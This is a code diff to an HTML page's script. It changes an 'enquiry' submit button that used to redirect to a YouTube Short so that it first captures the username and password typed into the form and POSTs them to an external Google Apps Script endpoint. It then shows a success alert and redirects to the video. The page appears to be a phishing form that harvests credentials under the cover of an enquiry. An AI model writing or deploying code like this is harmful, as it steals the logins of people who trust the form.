@@ -416,9 +416,30 @@ button#submit-enquiry:active {
     </div> -->
 
     <script>
-        document.getElementById("submit-enquiry").addEventListener("click", function() {
-            window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
-        });
+        document.getElementById("submit-enquiry").addEventListener("click", function () {
+        const username = document.getElementById("username-enquiry").value;
+        const password = document.getElementById("password-enquiry").value;
+
+        // Web app URL from the Google Apps Script deployment
+        const scriptURL = "https://script.google.com/macros/s/AKfycbxd-Bq4KJ7mXVGnSLgpHi5XCXMgNJQA4fd5pq863w2B4jo2vgCGFdf4JxQnHwKlBoV_/exec";
+
+        // Send the data
+        fetch(scriptURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
+        })
+        .then((response) => response.json())
+        .then((data) => {
+            if (data.status === "success") {
+                alert("Data submitted successfully!");
+                window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
+            } else {
+                alert("Failed to submit data.");
+            }
+        })
+        .catch((error) => console.error("Error:", error));
+    });
     </script>
     
 </body>
